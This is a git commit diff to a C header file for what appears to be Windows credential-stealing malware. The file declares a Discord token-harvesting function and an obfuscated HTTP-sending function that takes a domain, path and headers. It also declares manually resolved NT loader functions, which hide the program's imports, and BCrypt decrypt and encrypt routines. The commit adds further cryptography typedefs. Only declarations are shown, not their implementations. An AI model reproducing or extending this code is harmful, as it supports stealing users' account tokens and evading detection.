2e9c9b8dac9b376c1069006318d5ef0a2cf73e63
UnknownWebPT <exomsecowner@gmail.com>
2024-10-03 16:39:33 +0200

    Update global.h

--- include/global.h
+++ include/global.h
@@ -10,7 +10,8 @@
 #define WARN(MSG, ...) fprintf(stderr, "\x1b[97m[\x1b[91m-\x1b[97m] " MSG "\n", ##__VA_ARGS__)
 #define BCRYPT_INIT_AUTH_MODE_INFO(info) do { (info).dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION; (info).cbSize = sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO); (info).pbNonce = NULL; (info).cbNonce = 0; (info).pbAuthData = NULL; (info).cbAuthData = 0; (info).pbTag = NULL; (info).cbTag = 0; (info).pbMacContext = NULL; (info).cbMacContext = 0; (info).cbAAD = 0; (info).cbData = 0; (info).dwFlags = 0; } while (0)
 
-typedef BOOL(WINAPI * CryptStringToBinaryFunc)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *);
+typedef BOOL(WINAPI *CryptStringToBinaryFunc)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *);
+typedef BOOL(WINAPI *CryptBinaryToStringFunc)(const BYTE *, DWORD, DWORD, LPSTR, DWORD *);
 typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWCH Buffer; } UNICODE_STRING, *PUNICODE_STRING;
 typedef struct _ANSI_STRING    { USHORT Length; USHORT MaximumLength; PCHAR Buffer; } ANSI_STRING, *PANSI_STRING;
 typedef NTSTATUS (NTAPI* NtLdrLoadDll) (_In_opt_ PWSTR DllPath, _In_opt_ PULONG DllCharacteristics, _In_ PUNICODE_STRING DllName, _Out_ PVOID *DllHandle);
@@ -34,11 +35,14 @@ typedef BOOL(WINAPI *WinHttpSendRequestFunc)(HINTERNET, LPCWSTR, DWORD, LPVOID, 
 typedef BOOL(WINAPI *WinHttpReceiveResponseFunc)(HINTERNET, LPVOID);
 typedef BOOL(WINAPI *WinHttpCloseHandleFunc)(HINTERNET);
 typedef NTSTATUS (WINAPI *BCryptOpenAlgorithmProvider_t)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
+typedef NTSTATUS (WINAPI *BCryptImportKeyPair_t)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE, LPCWSTR, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, ULONG);
 typedef NTSTATUS (WINAPI *BCryptSetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
 typedef NTSTATUS (WINAPI *BCryptGenerateSymmetricKey_t)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
 typedef NTSTATUS (WINAPI *BCryptDecrypt_t)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
+typedef NTSTATUS (WINAPI *BCryptEncrypt_t)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
 typedef NTSTATUS (WINAPI *BCryptDestroyKey_t)(BCRYPT_KEY_HANDLE);
 typedef NTSTATUS (WINAPI *BCryptCloseAlgorithmProvider_t)(BCRYPT_ALG_HANDLE, ULONG);
+typedef NTSTATUS (WINAPI *BCryptGenRandom_t)(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags);
 int GetHandleNTAPI(NtLdrLoadDll* LoadLib, NtLdrGetProcedureAddress* GetProcAdd, NtLdrUnloadDll* UnloadLib);
 int Discord(const char *FilePath, char StoreTokens[10][100], int *StoreTokensLength);
 const char* WEIlnsAXWqfYLHUcHqaREFjqBBGaAY(const wchar_t* domain, const wchar_t* path, const wchar_t* headers);
